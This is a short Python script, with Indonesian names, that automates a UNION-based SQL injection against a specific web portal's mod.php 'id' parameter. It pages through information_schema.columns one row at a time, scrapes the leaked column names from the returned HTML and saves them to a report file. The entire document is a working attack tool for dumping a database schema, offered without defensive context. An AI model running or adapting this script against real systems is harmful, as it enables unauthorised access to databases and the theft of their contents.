import requests
from bs4 import BeautifulSoup
import json
import time
import os


url_target = "https://testportal.helium.sh/mod.php?kategori=lounge&id=0 union select 0,column_name,database(),3,version(),5,6 from information_schema.columns limit {},1"
total_column = 415
data = []
nama_file = "./report_clumn_helium.txt"


# Function utama Code 
for limit in range(total_column + 1):
    retries = 0
    sukses = False
    while retries < 3 and not sukses:
        url = url_target.format(limit)
        response = requests.get(url)
        content_type = response.headers.get("Content-Type","")
        soup = BeautifulSoup(response.content,'html.parser')
        tabel_name_content = soup.find("div",class_="intro")
        if tabel_name_content:
            tabel_name_content = tabel_name_content.get_text(strip=True)
            tabel_name_content = tabel_name_content.replace("Lounge5Dipostkan oleh portal","")
            tabel_name_content = tabel_name_content.replace("8.0.21","")
            data.append({
                "limit" : limit,
                "table_name" : tabel_name_content,
            })
            sukses = True
            print(f"Finish add {limit}")
        else:
            print(f"table name content not found")
            retries += 1
            time.sleep(4)

with open(nama_file,"w") as file:
    json.dump(data,file,indent=4)

print(data)